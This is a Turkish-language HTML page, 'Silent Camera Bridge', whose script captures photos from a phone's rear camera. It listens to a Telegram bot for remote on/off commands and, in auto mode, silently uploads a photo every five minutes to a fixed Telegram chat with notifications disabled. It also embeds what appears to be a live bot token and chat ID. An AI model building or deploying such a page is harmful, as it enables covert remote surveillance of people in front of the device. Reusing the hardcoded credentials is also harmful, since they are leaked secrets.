<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sessiz Kamera Köprüsü</title>
    <style>
        body { font-family: -apple-system, sans-serif; text-align: center; background: #000; color: #fff; padding: 20px; }
        #video { width: 100%; max-width: 400px; border-radius: 10px; background: #222; }
        .status { margin: 20px; padding: 10px; border-radius: 5px; background: #333; font-size: 14px; }
        .ready { color: #4CAF50; }
        .auto { color: #2196F3; }
    </style>
</head>
<body>
    <h2>Sessiz Kamera Köprüsü</h2>
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>
    <div id="status" class="status">Kamera başlatılıyor...</div>
    <p id="auto-status" style="font-size: 14px; color: #2196F3; font-weight: bold;"></p>

    <script>
        const BOT_TOKEN = '8571660857:AAHLCQJpPlJoh6EV_4mREjEB8JJ-JO-4frY';
        const CHAT_ID = '949655728';
        let lastUpdateId = 0;
        let autoMode = false;
        let autoInterval = null;

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const statusDiv = document.getElementById('status');
        const autoStatusDiv = document.getElementById('auto-status');

        async function initCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
                video.srcObject = stream;
                statusDiv.innerText = 'Sistem Hazır. Bot dinleniyor...';
                statusDiv.className = 'status ready';
                startPolling();
            } catch (err) { statusDiv.innerText = 'Kamera hatası: ' + err.message; }
        }

        async function takeAndSend(caption = "") {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            return new Promise(resolve => {
                canvas.toBlob(async b => {
                    const fd = new FormData();
                    fd.append('chat_id', CHAT_ID);
                    fd.append('photo', b, 'kamera.jpg');
                    if(caption) fd.append('caption', caption);
                    try {
                        // SESSİZ GÖNDERİM: notification kapalı
                        fd.append('disable_notification', 'true');
                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {method:'POST', body:fd}  );
                        resolve(true);
                    } catch(e) { resolve(false); }
                }, 'image/jpeg', 0.7);
            });
        }

        function toggleAuto(state) {
            autoMode = state;
            if (autoMode) {
                autoStatusDiv.innerText = 'SESSİZ OTOMATİK MOD: AÇIK';
                statusDiv.className = 'status auto';
                if (autoInterval) clearInterval(autoInterval);
                autoInterval = setInterval(() => {
                    takeAndSend("Sessiz Kayıt");
                }, 300000); // 5 dakika
            } else {
                autoStatusDiv.innerText = '';
                statusDiv.className = 'status ready';
                if (autoInterval) clearInterval(autoInterval);
                autoInterval = null;
            }
        }

        async function startPolling() {
            while (true) {
                try {
                    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=30`  );
                    const data = await res.json();
                    if (data.ok && data.result.length > 0) {
                        for (const u of data.result) {
                            lastUpdateId = u.update_id;
                            if (u.message && u.message.text) {
                                const t = u.message.text.toUpperCase();
                                if (t === 'OTOMATİK AÇ' || t === 'OTOMATIK AC') toggleAuto(true);
                                else if (t === 'OTOMATİK KAPAT' || t === 'OTOMATIK KAPAT') toggleAuto(false);
                            }
                        }
                    }
                } catch (e) { await new Promise(r => setTimeout(r, 5000)); }
            }
        }
        initCamera();
    </script>
</body>
</html>
